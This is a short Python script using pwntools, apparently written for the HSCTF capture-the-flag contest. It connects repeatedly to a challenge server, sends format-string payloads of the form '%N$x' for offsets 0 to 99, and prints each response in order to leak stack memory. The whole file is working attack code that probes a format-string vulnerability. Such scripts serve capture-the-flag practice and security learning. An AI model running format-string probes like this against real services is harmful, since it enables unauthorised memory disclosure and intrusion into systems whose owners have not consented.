from pwn import *

for i in range(0,100):
	p = remote("cat.hsctf.com",1337)
	payload = "%"+str(i)+"$"+"x"
	p.sendline(payload.encode())
	print(i,p.recv())
	p.close()
